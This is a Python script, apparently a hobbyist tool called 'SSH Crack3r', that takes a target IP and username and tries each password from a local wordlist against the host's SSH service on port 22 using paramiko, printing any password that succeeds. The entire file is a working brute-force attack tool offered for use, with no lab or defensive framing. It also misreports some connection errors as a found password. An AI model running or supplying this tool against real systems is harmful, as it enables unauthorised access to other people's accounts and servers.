from logging import exception
import pyfiglet
from tqdm import tqdm
import paramiko
import sys
import os


def interface():
    banner = pyfiglet.figlet_format("SSH Crack3r")
    print (banner) 
    print("[*] welcome to ssh crack3r. ")
    print("[===========================================]")

interface() 

target = str(input('[*] Please enter target IP address: '))
username = str(input('[*]Please enter username to bruteforce: '))
password_file = "/home/onehb/Documents/wordlist2.txt"

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code

with open(password_file, 'r') as file:
    for line in tqdm(file.readlines()):
        sys.stdout.flush() 
        password = line.strip()
        
        try:
            response = ssh_connect(password)

            if response == 0:
                 print('password found: '+ password)
                 exit(0)
            elif response == 1: 
                print('no luck')
        except Exception as e:
            print(e)
        pass

file.close()
